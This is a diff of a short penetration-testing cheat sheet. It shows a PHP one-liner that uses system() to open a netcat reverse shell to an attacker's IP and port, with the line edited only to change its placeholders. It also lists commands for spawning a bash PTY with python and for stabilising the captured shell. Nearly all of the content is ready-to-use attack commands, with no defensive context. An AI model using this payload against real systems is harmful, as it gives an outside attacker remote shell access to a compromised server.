@@ -6,12 +6,16 @@
 
 	vim <filename>.php
 	## PHP line
-	<?php system ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT> >/tmp/f'); ?>
+	<?php system ('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ATTACKING IP} {LISTENING PORT} >/tmp/f'); ?>
+
 	## TTY Upgrade 1	
+
 	python bash spawn : [python3 -c 'import pty; pty.spawn("/bin/bash")']
 	## In reverse shell
 	$ python -c 'import pty; pty.spawn("/bin/bash")'
+
 ###############################################
+
 	TTY Upgrade 2: Needs testing .
 	## In owned machined terminal
 	Ctrl-Z
@@ -23,4 +27,5 @@
 	$ export SHELL=bash
 	$ export TERM=xterm-256color
 	$ stty rows <num> columns <cols>
+
 ################################################
